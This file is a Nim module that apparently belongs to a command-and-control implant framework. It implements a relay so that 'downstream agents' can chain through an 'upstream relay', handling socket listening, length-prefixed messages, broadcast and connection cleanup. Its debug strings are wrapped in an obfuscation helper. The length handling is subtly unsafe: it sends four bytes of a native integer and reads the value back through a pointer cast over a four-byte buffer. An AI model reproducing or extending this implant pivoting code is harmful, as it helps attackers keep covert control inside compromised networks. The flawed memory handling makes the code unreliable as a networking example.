import net, strutils, json, times, selectors
import relay_protocol
import ../../util/[crypto, strenc]

type
    RelayConnection* = object
        socket*: Socket
        isConnected*: bool
        remoteHost*: string
        remotePort*: int
    
    RelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
        connections*: seq[RelayConnection]

# Create relay connection to upstream relay
proc connectToRelay*(host: string, port: int): RelayConnection =
    result.remoteHost = host
    result.remotePort = port
    result.isConnected = false
    
    try:
        result.socket = newSocket()
        result.socket.connect(host, Port(port))
        result.isConnected = true
        
        when defined verbose:
            echo obf("[DEBUG]: Connected to relay at ") & host & ":" & $port
    except:
        result.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to connect to relay at ") & host & ":" & $port

# Start relay server for downstream agents
proc startRelayServer*(port: int): RelayServer =
    result.port = port
    result.isListening = false
    result.connections = @[]
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        result.isListening = true
        
        when defined verbose:
            echo obf("[DEBUG]: Relay server listening on port ") & $port
    except:
        result.isListening = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to start relay server on port ") & $port

# Accept new downstream connection
proc acceptConnection*(server: var RelayServer): RelayConnection =
    result.isConnected = false
    
    if not server.isListening:
        return
    
    try:
        var clientSocket: Socket
        server.socket.accept(clientSocket)
        result.socket = clientSocket
        result.isConnected = true
        result.remoteHost = ""  # Will be filled by client registration
        result.remotePort = 0
        
        server.connections.add(result)
        
        when defined verbose:
            echo obf("[DEBUG]: Accepted new downstream connection")
    except:
        result.isConnected = false

# Send message through connection
proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
    if not conn.isConnected:
        return false
    
    try:
        let serializedMsg = serialize(msg)
        let msgLength = serializedMsg.len
        
        # Send message length first (4 bytes)
        discard conn.socket.send(cast[pointer](addr msgLength), 4)
        # Send message data
        conn.socket.send(serializedMsg)
        
        when defined verbose:
            echo obf("[DEBUG]: Sent message type ") & $msg.msgType & obf(" to ") & conn.remoteHost
        
        return true
    except:
        conn.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to send message, connection lost")
        return false

# Receive message from connection
proc receiveMessage*(conn: var RelayConnection): RelayMessage =
    if not conn.isConnected:
        return
    
    try:
        # Receive message length first (4 bytes)
        var lengthBuffer = newString(4)
        let bytesRead = conn.socket.recv(lengthBuffer, 4)
        
        if bytesRead != 4:
            conn.isConnected = false
            return
        
        let msgLength = cast[ptr int](lengthBuffer[0].unsafeAddr)[]
        
        # Receive message data
        var msgBuffer = newString(msgLength)
        let msgBytesRead = conn.socket.recv(msgBuffer, msgLength)
        
        if msgBytesRead != msgLength:
            conn.isConnected = false
            return
        
        result = deserialize(msgBuffer)
        
        when defined verbose:
            echo obf("[DEBUG]: Received message type ") & $result.msgType & obf(" from ") & conn.remoteHost
            
    except:
        conn.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to receive message, connection lost")

# Close connection
proc closeConnection*(conn: var RelayConnection) =
    if conn.isConnected:
        try:
            conn.socket.close()
        except:
            discard
        conn.isConnected = false

# Close relay server
proc closeRelayServer*(server: var RelayServer) =
    if server.isListening:
        try:
            # Close all client connections
            for conn in server.connections.mitems:
                closeConnection(conn)
            server.connections = @[]
            
            # Close server socket
            server.socket.close()
        except:
            discard
        server.isListening = false

# Poll for incoming messages (blocking with timeout)
proc pollMessages*(conn: var RelayConnection, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not conn.isConnected:
        return
    
    try:
        # Simple blocking receive with timeout
        # In production, this would use proper non-blocking I/O
        let msg = receiveMessage(conn)
        if validateMessage(msg):
            result.add(msg)
    except:
        conn.isConnected = false

# Poll relay server for new connections and messages (simplified)
proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not server.isListening:
        return
    
    try:
        # Simplified polling - check existing connections for messages
        for conn in server.connections.mitems:
            if conn.isConnected:
                # Try to receive message (non-blocking simulation)
                try:
                    let msg = receiveMessage(conn)
                    if validateMessage(msg):
                        result.add(msg)
                except:
                    # Connection lost or no data available
                    conn.isConnected = false
    except:
        when defined verbose:
            echo obf("[DEBUG]: Error polling relay server")

# Broadcast message to all downstream connections
proc broadcastMessage*(server: var RelayServer, msg: RelayMessage): int =
    result = 0
    
    for conn in server.connections.mitems:
        if conn.isConnected:
            if sendMessage(conn, msg):
                result += 1

# Send message to specific downstream connection by agent ID
proc sendToAgent*(server: var RelayServer, agentID: string, msg: RelayMessage): bool =
    # This would require maintaining agent ID to connection mapping
    # For now, broadcast and let agents filter
    let sent = broadcastMessage(server, msg)
    result = sent > 0

# Clean up dead connections
proc cleanupConnections*(server: var RelayServer) =
    var activeConnections: seq[RelayConnection] = @[]
    
    for conn in server.connections:
        if conn.isConnected:
            activeConnections.add(conn)
        else:
            when defined verbose:
                echo obf("[DEBUG]: Removed dead connection")
    
    server.connections = activeConnections

# Get connection statistics
proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connections: int] =
    result.listening = server.isListening
    result.connections = 0
    
    for conn in server.connections:
        if conn.isConnected:
            result.connections += 1 